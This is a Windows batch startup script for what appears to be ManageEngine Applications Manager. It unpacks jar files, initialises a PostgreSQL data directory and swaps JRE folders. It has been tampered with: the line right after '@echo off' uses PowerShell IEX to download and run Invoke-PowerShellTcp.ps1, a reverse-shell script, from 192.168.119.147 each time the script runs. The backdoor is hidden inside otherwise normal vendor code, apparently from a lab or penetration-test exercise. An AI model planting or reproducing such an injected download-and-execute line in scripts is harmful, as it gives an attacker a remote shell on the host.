@echo off
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.147/Invoke-PowerShellTcp.ps1')
set gzfilecount=0

set exe_dir="%cd%"

IF "%NMS_HOME%"=="" goto setEnv
IF "%NMS_HOME%"=="." goto setEnv

:setEnv
	IF NOT EXIST classes (
		cd ..
	)
	call .\setEnv.bat

cd "%NMS_HOME%"


for /f "tokens=2  delims==" %%D in ('findstr /N "am.dbserver" "..\conf\AMServer.properties"') do set dbType=%%D

for /f "tokens=2  delims==" %%D in ('findstr /N "am.dbport.check" "..\conf\AMServer.properties"') do set dbPortCheck=%%D

FOR %%G IN (%NMS_CLASSES%/*.pack.gz) DO set /A gzfilecount+=1


if  [%gzfilecount%] == [0] goto unpacked

if x"%NMS_HOME%"==x  (
 echo home not set
 exit 1;
)

if NOT EXIST "%NMS_HOME%" exit 1

cd /D "%NMS_HOME%"

echo Unpacking of jar files in progress....Please wait..

for /R %%i in (*.pack.gz) do move "%%i" "%%~dpi%%~ni"> unpacklog.txt 2>&1

for /R %%i in (*.pack) do  %JAVA_HOME%\bin\unpack200  -J-mx200M -r "%%i" "%%~dpi%%~ni.jar"> unpacklog.txt 2>&1

for /R %%i in (*.pack) do if EXIST "%%~dpi%%~ni.jar"( del "%%i"> unpacklog.txt 2>&1 )

move %NMS_CLASSES%\classes12.jar %NMS_CLASSES%\classes12.zip> unpacklog.txt 2>&1

echo Unpacking complete

%JAVA_HOME%\bin\javaw -Xshare:dump

cd /D "%NMS_HOME%"

:unpacked

if "%dbType%"=="pgsql" if NOT EXIST %PGSQL_HOME%\data\amdb  if  EXIST "%NMS_HOME%"\bin\password.txt if "%dbPortCheck%"=="true" (
	echo "AppManager Info: PgSQL data directory initialization starting.."

	if NOT EXIST "%NMS_HOME%"\..\logs (
		mkdir "%NMS_HOME%"\..\logs
	)

	echo "calling initPGSQLDB.."

	cd "%NMS_HOME%"

	call bin\initPGSQLDB.bat > "%NMS_HOME%"\..\logs\initPGSQLDB_log.txt

	echo "AppManager Info: Finished PgSQL data directory initialization"
)

if EXIST "%NMS_HOME%"\jre1.6 (
	set RXTX_DLL="%NMS_HOME%"\jre_old\bin\rxtxSerial.dll
	set RXTX_DLL_TODIR=%JAVA_HOME%\bin

	set RXTX_JAR="%NMS_HOME%"\jre_old\lib\ext\RXTXcomm.jar
	set RXTX_JAR_TODIR=%JAVA_HOME%\lib\ext

	move %JAVA_HOME% "%NMS_HOME%"\jre_old
	move "%NMS_HOME%"\jre1.6 %JAVA_HOME%

	xcopy %RXTX_DLL% %RXTX_DLL_TODIR% /D /E /C /R /H /I /K /Y
	xcopy %RXTX_JAR% %RXTX_JAR_TODIR% /D /E /C /R /H /I /K /Y
	cd "%NMS_HOME%"\apache\tomcat_old
    	for /R %%i in (*.keystore) do copy "%%i" %TOMCAT_HOME%
)

cd %exe_dir%
